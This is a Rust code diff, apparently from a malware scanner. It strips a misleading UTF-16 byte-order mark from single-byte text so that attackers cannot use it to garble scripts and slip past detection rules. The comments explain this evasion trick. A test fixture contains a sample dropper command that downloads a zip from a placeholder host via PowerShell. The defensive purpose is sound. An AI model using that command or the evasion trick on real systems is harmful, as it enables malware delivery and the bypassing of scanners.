@@ -61,6 +61,30 @@ impl AsRef<[u8]> for FileData {
     }
 }
 
+/// The payload of a BOM that lies about the encoding.
+///
+/// Some builders prepend a UTF-16 BOM to ordinary single-byte text. The two
+/// bytes cost nothing and, to anything that picks its decoder from them alone,
+/// turn the whole file into mojibake: `powershell -command "Invoke-WebRequest
+/// ..."` decodes as CJK, no text rule matches a single byte of it, and a batch
+/// dropper that carried twenty-two findings carries two.
+///
+/// Real UTF-16 is not mistaken for this. ASCII encoded as UTF-16 has a NUL
+/// beside every character, while the malformed form is valid UTF-8 with no
+/// embedded NULs. A trailing NUL is tolerated as a terminator. Same test
+/// filefacts applies to the same problem.
+fn mislabelled_bom_payload(data: &[u8]) -> Option<&[u8]> {
+    let payload = data
+        .strip_prefix(&[0xFF, 0xFE])
+        .or_else(|| data.strip_prefix(&[0xFE, 0xFF]))?;
+    let text_end = payload
+        .iter()
+        .rposition(|&byte| byte != 0)
+        .map_or(0, |i| i + 1);
+    let text = &payload[..text_end];
+    (!text.is_empty() && !text.contains(&0) && std::str::from_utf8(text).is_ok()).then_some(payload)
+}
+
 /// Detect if data is UTF-16 encoded and convert to UTF-8 if needed.
 ///
 /// Detects UTF-16 LE/BE by BOM (FF FE or FE FF) and converts to UTF-8.
@@ -74,6 +98,12 @@ impl AsRef<[u8]> for FileData {
 ///
 /// UTF-8 encoded data (either converted or original if already UTF-8)
 pub fn normalize_text_encoding(data: &[u8]) -> Cow<'_, [u8]> {
+    // A BOM in front of single-byte text is a claim, not an encoding. Strip it
+    // and keep the bytes rather than decoding them into nonsense.
+    if let Some(payload) = mislabelled_bom_payload(data) {
+        return Cow::Borrowed(payload);
+    }
+
     // Check for UTF-16 LE BOM (FF FE)
     if data.len() >= 2 && data[0] == 0xFF && data[1] == 0xFE {
         tracing::debug!("Detected UTF-16 LE encoding, converting to UTF-8");
@@ -276,6 +306,60 @@ mod tests {
         let data = read_file_normalized(temp_file.path()).unwrap();
         let text = String::from_utf8(data.as_slice().to_vec()).unwrap();
         assert_eq!(text, "hello");
+    }
+
+    #[test]
+    fn a_bom_in_front_of_single_byte_text_is_stripped_not_decoded() {
+        // Two bytes an attacker adds for free. Decoding on the BOM alone turns
+        // the script into CJK mojibake and every text rule stops matching:
+        // measured at 2 findings with the BOM against 21 without it, including
+        // the hostile one.
+        let script =
+            b"@echo off\r\npowershell -command \"Invoke-WebRequest -uri https://x/a.zip\"\r\n";
+        let mut lied_about = vec![0xFF, 0xFE];
+        lied_about.extend_from_slice(script);
+        assert_eq!(
+            normalize_text_encoding(&lied_about).as_ref(),
+            script.as_slice(),
+            "payload must survive verbatim"
+        );
+
+        // The big-endian BOM gets the same treatment.
+        let mut be = vec![0xFE, 0xFF];
+        be.extend_from_slice(script);
+        assert_eq!(normalize_text_encoding(&be).as_ref(), script.as_slice());
+
+        // A trailing NUL terminator does not make it real UTF-16.
+        let mut terminated = vec![0xFF, 0xFE];
+        terminated.extend_from_slice(b"echo hi");
+        terminated.push(0);
+        assert_eq!(normalize_text_encoding(&terminated).as_ref(), b"echo hi\0");
+    }
+
+    #[test]
+    fn genuine_utf16_is_still_decoded() {
+        // The NUL beside every character is what distinguishes it.
+        let mut real = vec![0xFF, 0xFE];
+        for c in "echo hi".chars() {
+            real.push(c as u8);
+            real.push(0);
+        }
+        assert_eq!(normalize_text_encoding(&real).as_ref(), b"echo hi");
+
+        let mut real_be = vec![0xFE, 0xFF];
+        for c in "echo hi".chars() {
+            real_be.push(0);
+            real_be.push(c as u8);
+        }
+        assert_eq!(normalize_text_encoding(&real_be).as_ref(), b"echo hi");
+    }
+
+    #[test]
+    fn a_bare_bom_is_left_alone() {
+        assert_eq!(
+            normalize_text_encoding(&[0xFF, 0xFE]).as_ref(),
+            &[] as &[u8]
+        );
     }
 
     #[test]
